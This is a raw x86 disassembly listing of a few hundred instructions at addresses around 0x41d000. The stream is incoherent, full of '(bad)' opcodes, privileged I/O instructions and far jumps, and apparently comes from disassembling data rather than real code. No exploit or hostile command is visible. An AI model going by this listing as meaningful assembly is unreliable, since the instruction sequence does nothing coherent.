  41d079:	xlat   BYTE PTR ds:[ebx]
  41d07a:	iret   
  41d07b:	fidiv  WORD PTR ds:0xc5608394
  41d081:	sub    cl,ch
  41d083:	ds inc esi
  41d085:	add    ebx,DWORD PTR [edi-0x77]
  41d088:	jg     0x41d0a5
  41d08a:	fdiv   QWORD PTR [ebx-0x79]
  41d08d:	iretw  
  41d08f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d090:	daa    
  41d091:	into   
  41d092:	repnz out 0x20,eax
  41d095:	shl    DWORD PTR [ebx+eax*4],cl
  41d098:	inc    ebp
  41d099:	cwde   
  41d09a:	iret   
  41d09b:	(bad)  
  41d09c:	aaa    
  41d09d:	mov    cl,0x27
  41d09f:	inc    edx
  41d0a0:	sbb    ecx,eax
  41d0a2:	jge    0x41d0c9
  41d0a4:	pop    esi
  41d0a5:	mul    DWORD PTR [eax-0x71]
  41d0a8:	mov    ebx,0x82cb0253
  41d0ad:	out    dx,al
  41d0ae:	loope  0x41d059
  41d0b0:	and    eax,0x71292f68
  41d0b5:	clc    
  41d0b6:	sar    DWORD PTR [eax-0x41183a27],cl
  41d0bc:	mov    cl,0x90
  41d0be:	shl    DWORD PTR [ebp-0x22],0x15
  41d0c2:	sti    
  41d0c3:	enter  0x688f,0xde
  41d0c7:	sub    bh,BYTE PTR [ebx]
  41d0c9:	fldenv [ebp-0x3a2fec8d]
  41d0cf:	mov    ah,0xdc
  41d0d1:	fwait
  41d0d2:	int3   
  41d0d3:	pop    edx
  41d0d4:	addr16 jno 0x41d0aa
  41d0d7:	pop    esp
  41d0d8:	fsub   QWORD PTR [edi]
  41d0da:	(bad)  
  41d0db:	out    0x3b,al
  41d0dd:	inc    ecx
  41d0de:	push   eax
  41d0df:	ins    DWORD PTR es:[edi],dx
  41d0e0:	sub    ah,BYTE PTR [edx+0x1c243ff5]
  41d0e6:	jne    0x41d0b7
  41d0e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0e9:	in     eax,0x2
  41d0eb:	push   ds
  41d0ec:	push   esi
  41d0ed:	test   BYTE PTR [ebx+0x28],0xeb
  41d0f1:	retf   
  41d0f2:	mov    edx,0x96a4c873
  41d0f7:	out    dx,al
  41d0f8:	pop    ss
  41d0f9:	sahf   
  41d0fa:	push   ebp
  41d0fb:	mov    ebp,edx
  41d0fd:	aad    0xf2
  41d0ff:	mul    BYTE PTR [eax-0x5e143732]
  41d105:	sub    BYTE PTR [ecx+0x56],ch
  41d108:	test   eax,0x961c93c0
  41d10d:	lods   eax,DWORD PTR ds:[esi]
  41d10e:	and    DWORD PTR [esp+ebp*2],edx
  41d111:	push   ebp
  41d112:	sub    DWORD PTR [ecx+edi*2],0x5f
  41d116:	pop    esp
  41d117:	jnp    0x41d0fb
  41d119:	dec    esi
  41d11a:	rcl    DWORD PTR [ebx+0x10],cl
  41d11d:	mov    al,ds:0xfdf192dd
  41d122:	hlt    
  41d123:	ss call 0x8bb7af59
  41d129:	das    
  41d12a:	xchg   DWORD PTR [esi-0x7c],ebp
  41d12d:	pop    ss
  41d12e:	inc    ecx
  41d12f:	iret   
  41d130:	ds sub ah,dh
  41d133:	fwait
  41d134:	mov    ecx,eax
  41d136:	add    esi,DWORD PTR [ebx-0x24]
  41d139:	jne    0x41d0c3
  41d13b:	arpl   bx,bp
  41d13d:	mov    dl,0x2d
  41d13f:	shl    DWORD PTR [ebx],cl
  41d141:	mul    BYTE PTR ds:0x167173ef
  41d147:	add    eax,0xf2126187
  41d14c:	ds xchg esp,eax
  41d14e:	ins    DWORD PTR es:[edi],dx
  41d14f:	ins    DWORD PTR es:[edi],dx
  41d150:	mov    bh,dl
  41d152:	push   0xffffffb2
  41d154:	adc    esi,esp
  41d156:	les    eax,FWORD PTR ds:0xfa921932
  41d15c:	jno    0x41d195
  41d15e:	inc    edx
  41d15f:	aad    0x5f
  41d161:	pop    ebp
  41d162:	inc    ebp
  41d163:	aas    
  41d164:	xchg   edi,eax
  41d165:	mov    dh,0x9e
  41d167:	xchg   ebp,eax
  41d168:	call   0x9233c73b
  41d16d:	rcr    DWORD PTR [edi-0x4c65f6a],1
  41d173:	mov    ds:0x8d404533,eax
  41d178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d179:	cdq    
  41d17a:	call   0xbad9ba72
  41d17f:	push   edi
  41d180:	xchg   esi,eax
  41d181:	test   eax,0x36982eb9
  41d186:	push   ds
  41d187:	xchg   ecx,eax
  41d188:	cmc    
  41d189:	hlt    
  41d18a:	ret    0x46c5
  41d18d:	aam    0x76
  41d18f:	das    
  41d190:	out    0xe2,al
  41d192:	repnz add eax,0xa659efd7
  41d198:	repnz pop ds
  41d19a:	push   esp
  41d19b:	inc    ebp
  41d19c:	ins    BYTE PTR es:[edi],dx
  41d19d:	cmp    ecx,DWORD PTR [eax-0x2f]
  41d1a0:	ja     0x41d1d9
  41d1a2:	lahf   
  41d1a3:	fs popf 
  41d1a5:	call   FWORD PTR [esi+0x36]
  41d1a8:	xchg   DWORD PTR [ecx-0x22233d2d],ebx
  41d1ae:	jbe    0x41d1ae
  41d1b0:	dec    edx
  41d1b1:	sbb    eax,0xd058aeab
  41d1b6:	loop   0x41d1bc
  41d1b8:	inc    edx
  41d1b9:	jbe    0x41d1e3
  41d1bb:	add    al,BYTE PTR [edi+eiz*4+0x701f436b]
  41d1c2:	test   DWORD PTR [edi+0x3a],ebp
  41d1c5:	cmp    esp,eax
  41d1c7:	adc    BYTE PTR [ebx],bl
  41d1c9:	cdq    
  41d1ca:	mov    eax,0xf35beb2f
  41d1cf:	div    BYTE PTR [edx-0x7a304a78]
  41d1d5:	jno    0x41d202
  41d1d7:	mov    esi,0x553ad10e
  41d1dc:	aam    0x43
  41d1de:	fstp   DWORD PTR [edi+eiz*1]
  41d1e1:	pop    esp
  41d1e2:	push   es
  41d1e3:	inc    eax
  41d1e4:	push   ecx
  41d1e5:	test   cl,al
  41d1e7:	idiv   DWORD PTR [eax-0x5927fd08]
  41d1ed:	inc    DWORD PTR [esi]
  41d1ef:	arpl   WORD PTR [edi+0x43498688],di
  41d1f5:	dec    esp
  41d1f6:	cmc    
  41d1f7:	or     BYTE PTR [ecx+0x237adb47],al
  41d1fd:	dec    esi
  41d1fe:	(bad)  
  41d200:	in     al,dx
  41d201:	sbb    al,0xb
  41d203:	shr    BYTE PTR [edi],1
  41d205:	ja     0x41d1cc
  41d207:	mov    bh,BYTE PTR [edi-0x7b314fd8]
  41d20d:	ds ret 
  41d20f:	push   esp
  41d210:	pop    esi
  41d211:	loopne 0x41d19f
  41d213:	ficomp WORD PTR [eax+0xf]
  41d216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d217:	push   0xa8fed149
  41d21c:	mov    eax,ds:0x619ac363
  41d221:	test   esi,edi
  41d223:	inc    eax
  41d224:	retf   0x43a
  41d227:	pop    esp
  41d228:	sbb    ebx,DWORD PTR [ebp-0x3f]
  41d22b:	retf   
  41d22c:	mov    eax,fs
  41d22e:	adc    edi,esi
  41d230:	call   0x77207bc9
  41d235:	hlt    
  41d236:	lea    edi,[ebp+0x33]
  41d239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d23a:	xchg   edi,eax
  41d23b:	dec    edi
  41d23c:	lods   eax,DWORD PTR ds:[esi]
  41d23d:	pop    eax
  41d23e:	xor    eax,0xcda3a76c
  41d243:	sbb    al,0xea
  41d245:	or     DWORD PTR [esi+0x1b700692],esp
  41d24b:	nop
  41d24c:	mul    BYTE PTR ds:0x3fff6ae5
  41d252:	mov    dl,0xa0
  41d254:	pop    esp
  41d255:	test   eax,0xb93fc48f
  41d25a:	dec    esi
  41d25b:	mov    ch,0x59
  41d25d:	push   ss
  41d25e:	addr16 ja 0x41d2a8
  41d261:	(bad)  
  41d262:	adc    al,0x49
  41d264:	icebp  
  41d265:	push   es
  41d266:	fiadd  WORD PTR [ebx]
  41d268:	rcr    BYTE PTR [esi+0x5f],0x50
  41d26c:	push   esi
  41d26d:	aas    
  41d26e:	js     0x41d28c
  41d270:	popf   
  41d271:	cmp    DWORD PTR ds:0x871c4197,esp
  41d277:	xchg   BYTE PTR [ebx+eiz*1],bh
  41d27a:	popf   
  41d27b:	popa   
  41d27c:	sub    eax,0x9c32f97b
  41d281:	jne    0x41d2ac
  41d283:	push   ss
  41d284:	mov    bl,0xf0
  41d286:	cmp    ebp,ebp
  41d288:	push   edi
  41d289:	xor    edi,DWORD PTR [edi-0x4]
  41d28c:	jp     0x41d28e
  41d28e:	cmp    BYTE PTR [esi],dl
  41d290:	xchg   esp,eax
  41d291:	mov    bh,bl
  41d293:	(bad)  
  41d294:	mov    bh,0x9d
  41d296:	mov    ebp,0xcd781e35
  41d29b:	stc    
  41d29c:	adc    ebx,DWORD PTR [esi]
  41d29e:	dec    esp
  41d29f:	and    eax,esi
  41d2a1:	inc    esp
  41d2a2:	rsqrtps xmm0,xmm7
  41d2a5:	cwde   
  41d2a6:	xor    BYTE PTR [eax*2+0x4cdec223],bl
  41d2ad:	inc    esp
  41d2ae:	sti    
  41d2af:	mov    ds:0x4fd9f57e,al
  41d2b4:	loopne 0x41d2cb
  41d2b6:	adc    eax,0xbeb55b3a
  41d2bb:	popf   
  41d2bc:	iret   
  41d2bd:	das    
  41d2be:	dec    edi
  41d2bf:	(bad)  
  41d2c0:	pop    edi
  41d2c1:	mov    ebx,0xbca344a7
  41d2c6:	xchg   esi,eax
  41d2c7:	rcl    BYTE PTR [esi+eiz*2+0x8def19e],1
  41d2ce:	test   BYTE PTR [ecx-0x38add024],ah
  41d2d4:	call   0xde941e1
  41d2d9:	or     DWORD PTR [ebp+edx*4-0x6f],0xb590a148
  41d2e1:	sbb    BYTE PTR [edx-0x2624212d],dh
  41d2e7:	stc    
  41d2e8:	stos   BYTE PTR es:[edi],al
  41d2e9:	sbb    bl,BYTE PTR [edi+edi*2]
  41d2ec:	hlt    
  41d2ed:	cmp    eax,0x1e874684
  41d2f2:	iret   
  41d2f3:	and    dh,BYTE PTR [ebp+ebp*1+0x4b]
  41d2f7:	addr16 mov ds:0x7a67,al
  41d2fb:	pop    ebp
  41d2fc:	jb     0x41d28c
  41d2fe:	cli    
  41d2ff:	mov    ecx,DWORD PTR [eax+0x3e]
  41d302:	pop    ds
  41d303:	sbb    DWORD PTR [edx+0x14db0cf0],ebp
  41d309:	fild   DWORD PTR [ebx]
  41d30b:	cmc    
  41d30c:	xor    BYTE PTR [eax+0xcad7cbd],0xed
  41d313:	add    BYTE PTR [esi-0x55],bl
  41d316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d317:	xchg   esi,eax
  41d318:	outs   dx,DWORD PTR ds:[esi]
  41d319:	sbb    al,0xf7
  41d31b:	das    
  41d31c:	add    eax,0x92ee6d6d
  41d321:	cld    
  41d322:	or     eax,DWORD PTR [ecx]
  41d324:	xchg   esp,eax
  41d325:	sbb    eax,0x6e0d0388
  41d32a:	popa   
  41d32b:	leave  
  41d32c:	cmp    DWORD PTR [edx],esi
  41d32e:	div    DWORD PTR [esi]
  41d330:	xchg   edi,eax
  41d331:	mov    al,0xf2
  41d333:	push   ebp
  41d334:	inc    ecx
  41d335:	inc    esp
  41d336:	sub    dl,BYTE PTR [ecx-0x784a13af]
  41d33c:	add    DWORD PTR gs:[ebx+0x62],esp
  41d340:	imul   esi,DWORD PTR [esi],0x2c52cd2f
  41d346:	es adc DWORD PTR fs:[edx+0x41],0x1fb2b72c
  41d34f:	jmp    0x41d34e
  41d351:	xlat   BYTE PTR ds:[ebx]
  41d352:	adc    ch,BYTE PTR [ebx+0x9db38e1]
  41d358:	dec    esp
  41d359:	push   ds
  41d35a:	adc    BYTE PTR [ecx+esi*2+0x3407fce6],ah
  41d361:	mov    al,ds:0x9e90d5aa
  41d366:	pushf  
  41d367:	stos   BYTE PTR es:[edi],al
  41d368:	in     al,0x96
  41d36a:	push   edx
  41d36b:	xor    bl,BYTE PTR [eax+0x6a]
  41d36e:	jne    0x41d368
  41d370:	or     bl,ch
  41d372:	xchg   DWORD PTR [edi-0x21],ebx
  41d375:	jmp    0x41d316
  41d377:	mov    ch,0x1d
  41d379:	ud0    ebp,esi
  41d37c:	in     eax,dx
  41d37d:	cld    
  41d37e:	out    0x97,al
  41d380:	mov    ah,0x80
  41d382:	pop    ss
  41d383:	cmp    esi,DWORD PTR [ecx+0x2cd18b03]
  41d389:	dec    ebx
  41d38a:	mov    dh,0xa1
  41d38c:	dec    edi
  41d38d:	aam    0xf
  41d38f:	mov    al,ds:0x2dcd1f94
  41d394:	movq   mm5,QWORD PTR [edi]
  41d397:	or     bh,BYTE PTR [esi+0x8]
  41d39a:	xchg   ecx,eax
  41d39b:	fsin   
  41d39d:	mov    ecx,0xc417cc11
  41d3a2:	retf   
  41d3a3:	xlat   BYTE PTR ds:[ebx]
  41d3a4:	in     eax,0x46
  41d3a6:	jp     0x41d355
  41d3a8:	and    DWORD PTR [ecx+0x73715069],ecx
  41d3ae:	lock or DWORD PTR [ebp*4-0x65b80c4f],eax
  41d3b6:	xor    al,0xf1
  41d3b8:	xchg   bx,ax
  41d3ba:	fwait
  41d3bb:	into   
  41d3bc:	lods   eax,DWORD PTR ds:[esi]
  41d3bd:	dec    eax
  41d3be:	and    edi,DWORD PTR [esi+0x74]
  41d3c1:	mov    ebp,0x8b714f15
  41d3c6:	inc    esi
  41d3c7:	or     dl,al
  41d3c9:	ins    DWORD PTR es:[edi],dx
  41d3ca:	cs sahf 
  41d3cc:	xor    cl,BYTE PTR [ebx-0x46a565e8]
  41d3d2:	in     eax,dx
  41d3d3:	pop    ss
  41d3d4:	icebp  
  41d3d5:	pop    esi
  41d3d6:	push   es
  41d3d7:	ja     0x41d3c0
  41d3d9:	pop    ebx
  41d3da:	stc    
  41d3db:	ins    DWORD PTR es:[edi],dx
  41d3dc:	aaa    
  41d3dd:	mov    dl,0x35
  41d3df:	inc    esp
  41d3e0:	pop    ebx
  41d3e1:	inc    ebp
  41d3e2:	xchg   ebx,eax
  41d3e3:	xor    al,0xbc
  41d3e5:	mov    cl,0xd2
  41d3e7:	add    ah,al
  41d3e9:	mov    BYTE PTR [edi+0x13],bh
  41d3ec:	and    al,0x40
  41d3ee:	sti    
  41d3ef:	add    ebp,0x3
  41d3f2:	and    ebp,DWORD PTR [edi+ebp*2+0x3db1eca5]
  41d3f9:	sbb    BYTE PTR [ebx-0x38],cl
  41d3fc:	sbb    eax,0xe0f8931b
  41d401:	lods   al,BYTE PTR ds:[esi]
  41d402:	xor    al,0x43
  41d404:	add    eax,0xa1a42e6c
  41d409:	xlat   BYTE PTR ds:[ebx]
  41d40a:	ss popa 
  41d40c:	add    al,0x0
  41d40e:	(bad)  
  41d40f:	or     DWORD PTR [ebp+0x70],eax
  41d412:	sbb    DWORD PTR [eax+edx*2-0x55],ebx
  41d416:	sbb    edi,DWORD PTR [ecx+0x68]
  41d419:	adc    BYTE PTR [eax],0x7e
  41d41c:	pop    eax
  41d41d:	shr    BYTE PTR [esi+0x34],0x64
  41d421:	adc    ecx,eax
  41d423:	add    al,bl
  41d425:	pop    esp
  41d426:	sub    eax,esp
  41d428:	mov    WORD PTR [edx+0x4f],?
  41d42b:	jo     0x41d446
  41d42d:	sub    dl,0xa5
  41d430:	fs pop esi
  41d432:	pushf  
  41d433:	ja     0x41d416
  41d435:	mov    ch,0x9
  41d437:	aaa    
  41d438:	xor    dl,0x25
  41d43b:	popf   
  41d43c:	jg     0x41d3d0
  41d43e:	into   
  41d43f:	mov    ebp,0x4fca5c0b
  41d444:	repnz sub al,0x8b
  41d447:	xlat   BYTE PTR ds:[ebx]
  41d448:	sti    
  41d449:	push   ds
  41d44a:	push   ebx
  41d44b:	(bad)  
  41d44c:	xchg   ecx,eax
  41d44d:	mov    ebx,0x56e6997e
  41d452:	fstp   QWORD PTR [edx+0x6cc99bcb]
  41d458:	xchg   edx,eax
  41d459:	pop    edx
  41d45a:	int3   
  41d45b:	add    DWORD PTR [esi],ebx
  41d45d:	jo     0x41d4ce
  41d45f:	sub    DWORD PTR [esi],0xffffffdf
  41d462:	adc    al,0xf2
  41d464:	out    0x30,eax
  41d466:	daa    
  41d467:	sti    
  41d468:	add    esi,edx
  41d46a:	pushf  
  41d46b:	dec    esi
  41d46c:	jns    0x41d44f
  41d46e:	outs   dx,BYTE PTR ds:[esi]
  41d46f:	sbb    DWORD PTR [esp+ebp*2],ebp
  41d472:	call   0x12fa:0xe71f19f4
  41d479:	push   0xbbc958b4
  41d47e:	xor    bh,BYTE PTR [ebx]
  41d480:	push   eax
  41d481:	imul   esp,DWORD PTR [esi+edx*2],0x1e
  41d485:	xchg   ecx,eax
  41d486:	and    cl,al
  41d488:	add    al,0x1c
  41d48a:	out    0x99,eax
  41d48c:	les    esp,FWORD PTR [ebp+0x6664298]
  41d492:	xor    edx,ecx
  41d494:	call   0x15e7:0xc539659c
  41d49b:	imul   ebx,ecx,0x5cbb30b2
  41d4a1:	fidiv  DWORD PTR [eax-0x36]
  41d4a4:	xor    cl,BYTE PTR [eax-0x7f]
  41d4a7:	ret    
  41d4a8:	icebp  
  41d4a9:	add    eax,0xd1b252c7
  41d4ae:	daa    
  41d4af:	in     eax,0xd1
  41d4b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4b2:	pusha  
  41d4b3:	lahf   
  41d4b4:	or     al,0x8b
  41d4b6:	ror    BYTE PTR [esi],cl
  41d4b8:	pusha  
  41d4b9:	add    cl,BYTE PTR [edi-0x774f5681]
  41d4bf:	adc    al,0x14
  41d4c1:	or     eax,0x27ebf194
  41d4c6:	xor    edi,ebx
  41d4c8:	inc    esp
  41d4c9:	shl    DWORD PTR [ebp+0x38ad3250],cl
  41d4cf:	jmp    0x41d4b6
  41d4d1:	iret   
  41d4d2:	adc    BYTE PTR [ecx+0x19aa552],al
  41d4d8:	cs sbb eax,0x11cfd7c1
  41d4de:	mov    esi,0xa53b9fa9
  41d4e3:	and    al,BYTE PTR ds:0xf7e53d98
  41d4e9:	sub    al,0x9a
  41d4eb:	into   
  41d4ec:	and    BYTE PTR [eax],0x9f
  41d4ef:	fstp   TBYTE PTR [edi]
  41d4f1:	sub    edx,edx
  41d4f3:	stos   DWORD PTR es:[edi],eax
  41d4f4:	les    eax,FWORD PTR [ecx-0x4cd64a86]
  41d4fa:	sbb    DWORD PTR [ecx+0x2f48e9fb],edi
  41d500:	jmp    0x41d489
  41d502:	mov    ds:0x63526b4f,al
  41d507:	mov    cl,0x6d
  41d509:	fdivr  DWORD PTR [edx+ebx*4]
  41d50c:	outs   dx,DWORD PTR ds:[esi]
  41d50d:	and    eax,0xff51188
  41d512:	pop    ss
  41d513:	inc    eax
  41d514:	push   esi
  41d515:	fstp   QWORD PTR [edx+0x6839ffeb]
  41d51b:	push   ss
  41d51c:	inc    edi
  41d51d:	dec    esi
  41d51e:	xor    edx,esp
  41d520:	fs pop eax
  41d522:	outs   dx,BYTE PTR ds:[esi]
  41d523:	jb     0x41d4a6
  41d525:	mov    esi,0x615d4ea3
  41d52a:	adc    ah,BYTE PTR [esi+0x12]
  41d52d:	jae    0x41d59f
  41d52f:	sbb    BYTE PTR [ebp-0x27],bh
  41d532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d533:	imul   eax,edx,0xdef47a13
  41d539:	mov    esp,0x7f50a930
  41d53e:	rcr    DWORD PTR [ecx-0x2c],cl
  41d541:	or     bh,BYTE PTR [eax]
  41d543:	stos   BYTE PTR es:[edi],al
  41d544:	xor    BYTE PTR [edi-0x2e],0x6b
  41d548:	dec    ebp
  41d549:	sbb    BYTE PTR [ebx],dh
  41d54b:	dec    esi
  41d54c:	xchg   edx,eax
  41d54d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d54e:	push   0xd0d81bc6
  41d553:	mov    esp,0x378be62e
  41d558:	fs ret 
  41d55a:	xor    al,0xf3
  41d55c:	mov    DWORD PTR [edi-0x2de5019f],edx
  41d562:	outs   dx,DWORD PTR ds:[esi]
  41d563:	sbb    al,0x4c
  41d565:	(bad)  
  41d567:	inc    esp
  41d568:	ror    BYTE PTR [eax+0x5c026fc],0x48
  41d56f:	and    eax,0xb6e5f345
  41d574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d575:	cdq    
  41d576:	sbb    ebp,DWORD PTR [ecx]
  41d578:	loop   0x41d502
  41d57a:	js     0x41d592
  41d57c:	fwait
  41d57d:	xchg   edi,eax
  41d57e:	sahf   
  41d57f:	or     eax,0x963de414
  41d584:	cmp    BYTE PTR [ebx-0x2b],bl
  41d587:	mov    ah,0x6b
  41d589:	mov    ds:0xa9bf3c35,al
  41d58e:	push   edi
  41d58f:	js     0x41d590
  41d591:	into   
  41d592:	cwde   
  41d593:	pop    edx
  41d594:	out    0x19,eax
  41d596:	outs   dx,BYTE PTR ds:[esi]
  41d597:	jbe    0x41d59e
  41d599:	mov    dh,0xb
  41d59b:	test   DWORD PTR [edi+0x308108ce],ebx
  41d5a1:	scas   al,BYTE PTR es:[edi]
  41d5a2:	mov    edi,0xc63ae98f
  41d5a7:	ins    BYTE PTR es:[edi],dx
  41d5a8:	xchg   esi,eax
  41d5a9:	loopne 0x41d56c
  41d5ab:	xor    eax,eax
  41d5ad:	xor    al,0xe4
  41d5af:	push   esi
  41d5b0:	sbb    BYTE PTR [ecx],0x70
  41d5b3:	push   esp
  41d5b4:	cwde   
  41d5b5:	fwait
  41d5b6:	mov    dl,0x86
  41d5b8:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41d5ba:	pushf  
  41d5bb:	or     esp,0xd76e25c4
  41d5c1:	mov    eax,es:0x10eeb8d8
  41d5c7:	jno    0x41d62c
  41d5c9:	adc    ch,ah
  41d5cb:	and    BYTE PTR [eax+0x2ea91e01],ah
  41d5d1:	add    BYTE PTR [ecx],ah
  41d5d3:	nop
  41d5d4:	xor    edi,esi
  41d5d6:	inc    ecx
  41d5d7:	or     al,0x79
  41d5d9:	inc    esp
  41d5da:	mov    dh,0xf3
  41d5dc:	inc    ebp
  41d5dd:	xchg   edx,eax
  41d5de:	sbb    BYTE PTR [ebp-0x40f45ee],0xbf
  41d5e5:	test   DWORD PTR [edi],ebp
  41d5e7:	pop    ss
  41d5e8:	ja     0x41d61e
  41d5ea:	push   edi
  41d5eb:	test   eax,0x11782ed1
  41d5f0:	dec    ebx
  41d5f1:	repnz fild WORD PTR [edi+0x1f25d813]
  41d5f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5f9:	mov    edi,0x9a1b7ccb
  41d5fe:	adc    ah,BYTE PTR [eax+0x62c5d57c]
  41d604:	les    ecx,FWORD PTR [esi-0x6b59dbe5]
  41d60a:	ficomp DWORD PTR [edx-0x60]
  41d60d:	jno    0x41d618
  41d60f:	sahf   
  41d610:	neg    ch
  41d612:	clc    
  41d613:	(bad)  
  41d614:	mov    edx,0xb0da1cbd
  41d619:	std    
  41d61a:	(bad)  
  41d61b:	xchg   edi,eax
  41d61c:	or     DWORD PTR [ecx+0x55],esp
  41d61f:	js     0x41d64a
  41d621:	dec    ebx
  41d622:	aam    0x92
  41d624:	mov    dh,0xb
  41d626:	loop   0x41d61f
  41d628:	mov    ?,WORD PTR [edi-0x2834f603]
  41d62e:	out    0xcb,eax
  41d630:	in     eax,dx
  41d631:	(bad)  
  41d632:	hlt    
  41d633:	sub    al,0x51
  41d635:	repz dec eax
  41d637:	jp     0x41d5ba
  41d639:	pop    ecx
  41d63a:	sbb    al,0x59
  41d63c:	or     DWORD PTR [eax+0x5e],ebp
  41d63f:	dec    ecx
  41d640:	pop    eax
  41d641:	pop    ds
  41d642:	arpl   WORD PTR [ecx],dx
  41d644:	sbb    eax,0x150be668
  41d649:	in     eax,dx
  41d64a:	push   ebp
  41d64b:	ret    0x7705
  41d64e:	retf   
  41d64f:	adc    al,0xdb
  41d651:	shl    BYTE PTR [ebp+0x7c04ca27],0x66
  41d658:	in     al,0xf3
  41d65a:	sbb    BYTE PTR [edx],bl
  41d65c:	pop    eax
  41d65d:	mov    ah,0x44
  41d65f:	adc    DWORD PTR [ebx],ecx
  41d661:	lock jns 0x41d664
  41d664:	sbb    DWORD PTR [edx],edi
  41d666:	scas   eax,DWORD PTR es:[edi]
  41d667:	ror    DWORD PTR [edx],cl
  41d669:	imul   eax,DWORD PTR [esi-0x3df2419d],0x27316fc
  41d673:	das    
  41d674:	jae    0x41d606
  41d676:	inc    esi
  41d677:	sub    cl,bh
  41d679:	iret   
  41d67a:	inc    ecx
  41d67b:	jmp    0x74a215ba
  41d680:	xor    al,0x75
  41d682:	or     edx,DWORD PTR [edi]
  41d684:	pop    eax
  41d685:	xchg   ecx,eax
  41d686:	gs inc esp
  41d688:	setge  BYTE PTR [ecx]
  41d68b:	loopne 0x41d6a1
  41d68d:	jo     0x41d619
  41d68f:	ss push esi
  41d691:	push   ebx
  41d692:	iret   
  41d693:	adc    DWORD PTR [ecx],ebx
  41d695:	fs jmp 0x41d6b2
  41d698:	mov    ecx,0xa0475b99
  41d69d:	push   cs
  41d69e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d69f:	push   ecx
  41d6a0:	loop   0x41d70a
  41d6a2:	jnp    0x41d643
  41d6a4:	jne    0x41d6e9
  41d6a6:	and    BYTE PTR [esi-0x14],0xec
  41d6aa:	(bad)  
  41d6ab:	push   ebx
  41d6ac:	rcl    DWORD PTR ds:0x386d4574,0xe3
  41d6b3:	cmp    eax,0xef2a791e
  41d6b8:	or     BYTE PTR [edx],al
  41d6ba:	ficomp WORD PTR [esi-0x6c105a89]
  41d6c0:	mov    ecx,0x3926f1b5
  41d6c5:	fwait
  41d6c6:	test   DWORD PTR [ebx+0x75],eax
  41d6c9:	test   DWORD PTR [edi+0x3],edx
  41d6cc:	pop    ebx
  41d6cd:	and    ebp,DWORD PTR [ebx+0x68]
  41d6d0:	pop    edx
  41d6d1:	cmc    
  41d6d2:	lods   al,BYTE PTR ds:[esi]
  41d6d3:	aaa    
  41d6d4:	lock inc esi
  41d6d6:	hlt    
  41d6d7:	add    ecx,edx
  41d6d9:	cwde   
  41d6da:	and    ah,dl
  41d6dc:	daa    
  41d6dd:	imul   ecx,DWORD PTR [ecx+0x390037f9],0x1f
  41d6e4:	imul   eax,DWORD PTR [edx],0x27db2702
  41d6ea:	or     DWORD PTR ds:[ebx+0x693d20b8],ebp
  41d6f1:	jge    0x41d6d6
  41d6f3:	in     al,dx
  41d6f4:	cmp    al,0x36
  41d6f6:	pusha  
  41d6f7:	lds    ebx,FWORD PTR [ebx]
  41d6f9:	jg     0x41d6ae
  41d6fb:	fcomp  QWORD PTR [esi]
  41d6fd:	xor    eax,0x2d77d747
  41d702:	fsub   QWORD PTR [edx+0x65]
  41d705:	mov    ecx,0xc9914e8d
  41d70a:	dec    edi
  41d70b:	leave  
  41d70c:	ins    DWORD PTR es:[edi],dx
  41d70d:	xlat   BYTE PTR ds:[ebx]
  41d70e:	or     bl,BYTE PTR [edi+0x3009743f]
  41d714:	ficom  WORD PTR [edx]
  41d716:	pusha  
  41d717:	test   eax,0x50521539
  41d71c:	pop    ds
  41d71d:	push   ebx
  41d71e:	repnz pop ebp
  41d720:	adc    BYTE PTR [ecx],al
  41d722:	mov    ch,BYTE PTR [edx]
  41d724:	mov    esi,0xe8e3734d
  41d729:	cmp    al,0xb8
  41d72b:	push   ecx
  41d72c:	enter  0xb3bf,0xa5
  41d730:	cmp    eax,0x1c990041
  41d735:	in     eax,0x80
  41d737:	sub    al,0xb0
  41d739:	push   es
  41d73a:	mov    bh,bh
  41d73c:	sahf   
  41d73d:	lock xchg ebp,eax
  41d73f:	call   0x45ee:0xab17944f
  41d746:	inc    ebx
  41d747:	enter  0x6b30,0x97
  41d74b:	jns    0x41d761
  41d74d:	jp     0x41d789
  41d74f:	add    ecx,0xffffffa4
  41d752:	cli    
  41d753:	xlat   BYTE PTR ds:[ebx]
  41d754:	xchg   edx,eax
  41d755:	or     eax,0x6f848b53
  41d75a:	leave  
  41d75b:	mov    cl,0x91
  41d75d:	jp     0x41d76f
  41d75f:	adc    al,0x1f
  41d761:	mov    bl,0x6b
  41d763:	xchg   cl,dl
  41d765:	cli    
  41d766:	mov    esp,0xe9951f30
  41d76b:	inc    ecx
  41d76c:	xchg   BYTE PTR [ecx-0x4f],bh
  41d76f:	std    
  41d770:	and    BYTE PTR [eax-0x52],ah
  41d773:	cmp    ch,dl
  41d775:	neg    esp
  41d777:	js     0x41d760
  41d779:	gs ins BYTE PTR es:[edi],dx
  41d77b:	pop    ecx
  41d77c:	or     DWORD PTR [ecx-0x3e689b91],ebx
  41d782:	jmp    0xaa85:0xd8905e2f
  41d789:	xchg   edx,eax
  41d78a:	xchg   esp,eax
  41d78b:	and    esi,DWORD PTR [ebx]
  41d78d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d78e:	fst    DWORD PTR [ecx+0x2e]
  41d791:	(bad)  
  41d792:	scas   al,BYTE PTR es:[edi]
  41d793:	pop    ebp
  41d794:	imul   esi,DWORD PTR [edi],0x9a67aba1
  41d79a:	dec    edi
  41d79b:	sub    esp,ebx
  41d79d:	xchg   esp,eax
  41d79e:	pop    edi
  41d79f:	daa    
  41d7a0:	and    eax,0xa9019e15
  41d7a5:	test   eax,ebp
  41d7a7:	jnp    0x41d753
  41d7a9:	test   eax,0xc146dd88
  41d7ae:	jle    0x41d813
  41d7b0:	out    dx,eax
  41d7b1:	pushf  
  41d7b2:	mov    ecx,0x41b6c9b6
  41d7b7:	stos   DWORD PTR es:[edi],eax
  41d7b8:	outs   dx,BYTE PTR ds:[esi]
